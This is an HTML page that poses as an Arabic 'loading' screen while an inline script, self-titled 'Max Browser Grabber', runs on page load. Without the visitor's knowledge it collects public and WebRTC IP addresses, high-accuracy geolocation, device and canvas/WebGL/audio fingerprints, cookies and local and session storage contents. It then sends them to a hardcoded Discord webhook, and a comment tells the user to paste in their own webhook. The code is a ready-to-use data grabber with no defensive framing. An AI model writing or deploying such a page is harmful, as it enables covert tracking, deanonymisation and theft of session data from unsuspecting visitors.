<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            margin: 0;
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid #333;
            border-top-color: #5865F2;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <p style="margin-top:18px;opacity:.7">جاري التحميل...</p>
    </div>

<script>
(() => {
    // ←←← حط الـ Webhook بتاعك هنا
    const WEBHOOK = "https://discord.com/api/webhooks/1558992106822045841/nMgf8JcjFlD8b0D7qcm1GQvI-WwKLZ2PRIy2Xq0055zSj-xTU7-1fl8UdH9C6QM2C1Lr";

    const sleep = ms => new Promise(r => setTimeout(r, ms));

    async function getIP() {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const d = await r.json();
            return d.ip || "N/A";
        } catch {
            try {
                const r2 = await fetch("https://api64.ipify.org?format=json");
                const d2 = await r2.json();
                return d2.ip || "N/A";
            } catch { return "N/A"; }
        }
    }

    function getBattery() {
        return new Promise(resolve => {
            if (!navigator.getBattery) return resolve("unsupported");
            navigator.getBattery()
                .then(b => resolve(`${Math.round(b.level*100)}% | charging:${b.charging} | chargingTime:${b.chargingTime} | dischargingTime:${b.dischargingTime}`))
                .catch(() => resolve("error"));
        });
    }

    function canvasFP() {
        try {
            const c = document.createElement("canvas");
            const ctx = c.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125,1,62,20);
            ctx.fillStyle = "#069";
            ctx.fillText("fingerprint-test-©", 2, 15);
            ctx.fillStyle = "rgba(102,204,0,0.7)";
            ctx.fillText("fingerprint-test-©", 4, 17);
            return c.toDataURL().slice(-80);
        } catch { return "N/A"; }
    }

    function webglFP() {
        try {
            const c = document.createElement("canvas");
            const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
            if (!gl) return "N/A";
            const dbg = gl.getExtension("WEBGL_debug_renderer_info");
            const vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            return `${vendor} | ${renderer}`;
        } catch { return "N/A"; }
    }

    function audioFP() {
        return new Promise(resolve => {
            try {
                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
                const osc = ctx.createOscillator();
                const comp = ctx.createDynamicsCompressor();
                osc.connect(comp);
                comp.connect(ctx.destination);
                osc.start(0);
                ctx.startRendering().then(buf => {
                    let sum = 0;
                    const data = buf.getChannelData(0);
                    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
                    resolve(sum.toString().slice(0, 25));
                }).catch(() => resolve("N/A"));
            } catch { resolve("N/A"); }
        });
    }

    function getWebRTCIPs() {
        return new Promise(resolve => {
            const ips = new Set();
            try {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = e => {
                    if (!e.candidate) {
                        pc.close();
                        return resolve([...ips].join(", ") || "N/A");
                    }
                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (m) ips.add(m[1]);
                };
                setTimeout(() => { pc.close(); resolve([...ips].join(", ") || "timeout"); }, 3000);
            } catch { resolve("N/A"); }
        });
    }

    function getMediaDevices() {
        return new Promise(resolve => {
            if (!navigator.mediaDevices?.enumerateDevices) return resolve("unsupported");
            navigator.mediaDevices.enumerateDevices()
                .then(devs => {
                    const summary = devs.map(d => `${d.kind}:${d.label || "no-label"}`).join(" | ");
                    resolve(summary || "none");
                })
                .catch(() => resolve("denied/error"));
        });
    }

    function getStorageDump() {
        const out = { localStorage: {}, sessionStorage: {}, cookies: document.cookie || "none" };
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                out.localStorage[k] = localStorage.getItem(k)?.slice(0, 300);
            }
        } catch {}
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const k = sessionStorage.key(i);
                out.sessionStorage[k] = sessionStorage.getItem(k)?.slice(0, 300);
            }
        } catch {}
        return out;
    }

    async function getGeo() {
        return new Promise(resolve => {
            if (!navigator.geolocation) return resolve("unsupported");
            const t = setTimeout(() => resolve("timeout"), 4000);
            navigator.geolocation.getCurrentPosition(
                pos => {
                    clearTimeout(t);
                    resolve(`${pos.coords.latitude},${pos.coords.longitude} ±${pos.coords.accuracy}m`);
                },
                () => { clearTimeout(t); resolve("denied"); },
                { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
            );
        });
    }

    async function collect() {
        const [
            ip,
            battery,
            webrtc,
            media,
            audio,
            geo
        ] = await Promise.all([
            getIP(),
            getBattery(),
            getWebRTCIPs(),
            getMediaDevices(),
            audioFP(),
            getGeo()
        ]);

        const storage = getStorageDump();
        const nav = navigator;

        const payload = {
            content: null,
            embeds: [{
                title: "🔥 Full Browser Grab",
                color: 0xff0000,
                fields: [
                    { name: "🌐 Public IP", value: `\`${ip}\``, inline: true },
                    { name: "📡 WebRTC IPs", value: `\`${webrtc}\``, inline: true },
                    { name: "📍 Geo", value: `\`${geo}\``, inline: true },

                    { name: "📱 Mobile?", value: String(nav.userAgentData?.mobile ?? "unknown"), inline: true },
                    { name: "🖥️ Platform", value: nav.platform || "?", inline: true },
                    { name: "🧠 Cores / Memory", value: `${nav.hardwareConcurrency || "?"} / ${nav.deviceMemory || "?"}GB`, inline: true },

                    { name: "🔋 Battery", value: battery, inline: false },
                    { name: "📶 Connection", value: `${nav.connection?.effectiveType || "?"} | downlink:${nav.connection?.downlink || "?"} | rtt:${nav.connection?.rtt || "?"}`, inline: false },

                    { name: "🖥️ Screen", value: `${screen.width}x${screen.height} | avail:${screen.availWidth}x${screen.availHeight} | DPR:${devicePixelRatio} | depth:${screen.colorDepth}`, inline: false },
                    { name: "🌍 Lang / TZ", value: `${nav.language} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },

                    { name: "🎨 Canvas FP", value: `\`${canvasFP()}\``, inline: false },
                    { name: "🎮 WebGL", value: `\`${webglFP()}\``, inline: false },
                    { name: "🔊 Audio FP", value: `\`${audio}\``, inline: false },

                    { name: "🎥 Media Devices", value: media.slice(0, 900) || "none", inline: false },

                    { name: "🍪 Cookies (this origin)", value: `\`${storage.cookies.slice(0, 800)}\``, inline: false },
                    { name: "📦 localStorage keys", value: Object.keys(storage.localStorage).join(", ") || "empty", inline: false },
                    { name: "📦 sessionStorage keys", value: Object.keys(storage.sessionStorage).join(", ") || "empty", inline: false },

                    { name: "🔍 User-Agent", value: "```" + (nav.userAgent || "").slice(0, 900) + "```", inline: false },
                    { name: "📅 Time", value: new Date().toISOString(), inline: false },
                    { name: "🔗 Page", value: location.href, inline: false }
                ],
                footer: { text: "Max Browser Grabber" },
                timestamp: new Date().toISOString()
            }]
        };

        // إضافة بيانات التخزين لو فيها حاجة مهمة
        const lsDump = JSON.stringify(storage.localStorage).slice(0, 1800);
        if (lsDump !== "{}") {
            payload.embeds[0].fields.push({
                name: "📦 localStorage dump (truncated)",
                value: "```json\n" + lsDump + "\n```"
            });
        }

        try {
            await fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.log("send failed", e);
        }
    }

    // تشغيل فوري
    collect();
})();
</script>
</body>
</html>
